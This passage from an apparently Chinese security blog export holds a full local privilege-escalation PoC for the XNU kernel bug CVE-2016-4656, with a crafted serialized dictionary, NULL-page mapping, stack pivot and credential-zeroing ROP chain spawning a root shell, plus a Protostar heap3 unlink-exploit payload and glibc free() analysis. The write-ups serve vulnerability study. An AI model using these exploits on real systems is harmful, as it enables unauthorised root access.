NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。下面看我们的步骤： 制作一个二进制字典，释放OSString并重新分配OSData。 Map NULL 放置stack pivot在偏移0x20到NULL页面 将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链） 触发漏洞 提升权限，生成shell 下面看完整的Poc代码： void use_after_free(void) { kern_return_t kr = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; /* craft the dictionary */ printf(&quot;(i) Crafting dictionary...\\n&quot;); void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries WRITE_IN(dict, (kOSSerializeString | 4)); // string &#39;AAA&#39;, will get freed WRITE_IN(dict, (0x00414141)); WRITE_IN(dict, (kOSSerializeBoolean | 1)); // bool, true WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;BBB&#39; WRITE_IN(dict, (0x00424242)); WRITE_IN(dict, (kOSSerializeData | 32)); // data (0x00 * 32) WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;CCC&#39; WRITE_IN(dict, (0x00434343)); WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1)); // ref to object 1 (OSString) /* map the NULL page */ mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK); printf(&quot;(i) Leaking kslide...\\n&quot;); SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide /* set the stack pivot at 0x20 */ *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot /* build ROP chain */ printf(&quot;(i) Building ROP chain...\\n&quot;); rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); /* chain transfer, will redirect execution flow from 0x0 to our main chain above */ uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; /* trigger */ printf(&quot;(+) All done! Triggering the bug!\\n&quot;); host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; } 这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到下面一步一步分析 构造字典将如下构造 &lt;dict&gt; &lt;string&gt;AAA&lt;/string&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;symbol&gt;BBB&lt;/symbol&gt; &lt;data&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;/data&gt; &lt;symbol&gt;CCC&lt;/symbol&gt; &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt; &lt;/dict&gt; 当执行retain时就会以0x20的偏移量地址读取，也就是rip其值将为0x20可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术 Map NULL苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。 mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; 这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志 Pivoting stack和ROP链下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip首先将rip转移到0x20处 *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot 然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。 uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; 接着rip转移到main-&gt;chain，和前面一样ROP链一样，不过主链是为了达到提权的目的。主链的代码 rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); 主链的执行过程其实原理并不复杂： chain prototype: proc = current_proc();//找到当前程序的credentials结构 ucred = proc_ucred(proc); posix_cred = posix_cred_get(ucred); bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。 接下来的代码和之前一样，测试我们构造的dic是否有效： host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; 最后如果一切都顺利，我们检查当前进程getuid是否等于0，如果是就提权root成功，然后调用system(&quot;/bin/bash&quot;)弹出一个shell！ if (getuid() == 0) { puts(&quot;(+) got r00t!&quot;); system(&quot;/bin/bash&quot;); } 测试： 0x04 总结终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的黄大大和杨君大大，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：学好书不求甚解，爱技术不论用处，当我去用之前所学去理解一个个知识点的时候才体会到后半句：每有会意便欣然忘食 PoC完整的Poc代码在这里 特别感谢 mrh –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗 jndok’s blog –本文大多基于jndok的分析，可以去看看原文的分析 杨君的小黑屋–杨君大大特别有耐心，执着于技术，乐于分享技术 参考1.User Client Info.txt2.Attacking-The-XNU-Kernal-In-El-Capitain3.Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-18284.Defiling-Mac-OS-X-Ruxcon5.Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value6.认真分析mmap：是什么 为什么 怎么用7.Resolving kernel symbols OSUnserializeBinary源码 OSObject * OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString) { OSObject ** objsArray; uint32_t objsCapacity; uint32_t objsIdx; OSObject ** stackArray; uint32_t stackCapacity; uint32_t stackIdx; OSObject * result; OSObject * parent; OSDictionary * dict; OSArray * array; OSSet * set; OSDictionary * newDict; OSArray * newArray; OSSet * newSet; OSObject * o; OSSymbol * sym; size_t bufferPos; const uint32_t * next; uint32_t key, len, wordLen; bool end, newCollect, isRef; unsigned long long value; bool ok; if (errorString) *errorString = 0; if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL); if (3 &amp; ((uintptr_t) buffer)) return (NULL); if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL); bufferPos = sizeof(kOSSerializeBinarySignature); next = (typeof(next)) (((uintptr_t) buffer) + bufferPos); DEBG(&quot;---------OSUnserializeBinary(%p)\\n&quot;, buffer); objsArray = stackArray = NULL; objsIdx = objsCapacity = 0; stackIdx = stackCapacity = 0; result = 0; parent = 0; dict = 0; array = 0; set = 0; sym = 0; ok = true; while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); DEBG(&quot;key 0x%08x: 0x%04x, %d\\n&quot;, key, len, end); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeArray: o = newArray = OSArray::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; case kOSSerializeSymbol: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; if (0 != ((const char *)next)[len-1]) break; o = (OSObject *) OSSymbol::withCString((const char *) next); next += wordLen; break; case kOSSerializeString: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSString::withStringOfLength((const char *) next, len); next += wordLen; break; case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; case kOSSerializeBoolean: o = (len ? kOSBooleanTrue : kOSBooleanFalse); break; default: break; } if (!(ok = (o != 0))) break; if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } if (dict) { if (sym) { DEBG(&quot;%s = %s\\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName()); if (o != dict) ok = dict-&gt;setObject(sym, o); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } if (!ok) break; if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } } DEBG(&quot;ret %p\\n&quot;, result); if (objsCapacity) kfree(objsArray, objsCapacity * sizeof(*objsArray)); if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray)); if (!ok &amp;&amp; result) { result-&gt;release(); result = 0; } return (result); }","tags":[{"name":"Pegasus","slug":"Pegasus","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"},{"name":"cve","slug":"cve","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"},{"name":"CVE-2016-4655","slug":"CVE-2016-4655","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"},{"name":"CVE-2016-4656","slug":"CVE-2016-4656","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"},{"name":"PoC","slug":"PoC","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"}]},{"title":"PE格式分析","date":"2017-04-29T08:41:18.000Z","path":"2017/04/29/PE格式分析/PE格式分析/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[]},{"title":"Protostar-堆溢出学习-滥用堆metadata重定向程序执行","date":"2017-04-26T13:24:19.000Z","path":"2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/","text":"0x00 序 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对linux堆管理DLMalloc的分析这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; void winner() { printf(&quot;that wasn&#39;t too bad now, was it? @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf(&quot;dynamite failed?\\n&quot;); } 0x02 简单分析&amp;思考在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到winner()函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知free()函数中的unlink()函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行winner()函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。就照着这个思路来一步步实现这个过程。 0x03 调试1.输入AAAA BBBB CCCC然后free前后后观察堆结构由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。因为chunk的大小2–&gt;3–&gt;null`的方式连接 2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。因为我们准备向前合并，所以将preinuse位设为1，即64+1=65 3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。构造字符串：CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\\xfc\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\x1c\\xb1\\x04\\x08\\x0c\\xc0\\x04\\x08 4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。这里我们用在线的转换工具下面的汇编转化为x86指令字符串 mov eax,0x8048864 call eax 0x8048864为winner()函数地址 5.将上面的shellcode写入第一个chunk那里，here we hack！下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。GoT地址已经修改，下面可以看到已经执行了winnwe()函数 0x04 一点补充在上面构造chunk中，也许你已经发现了chunk大小为0xfffffffc，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看Once upon a free()这篇文章，简单的说就是当某个数加上0xfffffffc时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。 0x05 堆漏洞学习总结目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"metadata","slug":"metadata","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"},{"name":"DLMalloc","slug":"DLMalloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"}]},{"title":"深入理解Linux堆分配器-DLMalloc","date":"2017-04-23T04:16:00.000Z","path":"2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/","text":"0x00 序 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。 0x01 目录1.DLMalloc2.内存Chunk3.Bin4.malloc源码free()函数分析 0x02 DLMallocDoug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点： 稳定性(stability) 性能(performance) 避免碎片化(avoidance of fragmentation) 低空间开销(low space overhead）根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。 0x03 内存chunk1.什么是chunk？chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。 2.数据结构 struct malloc_chunk { INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用 INTERNAL_SIZE_T size; //当前chunk的大小 struct malloc_chunk * fd; //如果当前为释放chunk，指向双向free list中前一个chunk struct malloc_chunk * bk; //如果当前为释放chunk，指向双向free list中后一个chunk } 根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例: allocate chunk freed chunk 3.更多细节因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？然后可以想到有一个最小chunk的存在，其大小为16字节()。 4.特殊chunktop chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。 last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk. 0x04 Binchunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。这里我主要介绍fsatbin和normalbin (1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。 0x05 free()源代码分析及相关细节free(void *mem)--&gt;__libc_free(void *mem) void __libc_free (void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk (p); return; } ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); //跳转到_int_free } 我们先不关注其他的，只需要知道会调用_int_free就就可以了 __libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock) static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* 当前chunk的大小 */ mfastbinptr *fb; /* 相关的fastbin */ mchunkptr nextchunk; /* 下一个相邻的chunk */ INTERNAL_SIZE_T nextsize; /* 下一个chunk的大小 */ int nextinuse; /* 下一个chunk正在使用时为真 */ INTERNAL_SIZE_T prevsize; /* 前一个chunk的大小 */ mchunkptr bck; /* 指向free链表中向后一个chunk */ mchunkptr fwd; /* 指向free链表中向前一个chunk */ const char *errstr = NULL; int locked = 0; size = chunksize (p); /* Little security check which won&#39;t hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by &quot;design&quot; from some intruder. */ //一些安全检查 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) { errstr = &quot;free(): invalid pointer&quot;; errout: if (!have_lock &amp;&amp; locked) __libc_lock_unlock (av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ //检查是否满足大于等于最小大小 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) { errstr = &quot;free(): invalid size&quot;; goto errout; } check_inuse_chunk(av, p); //检查当前chunk是否在使用 /* 如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用 */ if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don&#39;t place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) #endif ) { if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); __libc_lock_lock (av-&gt;mutex); locked = 1; chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; })) { errstr = &quot;free(): invalid next size (fast)&quot;; goto errout; } if (! have_lock) { __libc_lock_unlock (av-&gt;mutex); locked = 0; } } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = &quot;double free or corruption (fasttop)&quot;; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; } while ((old = 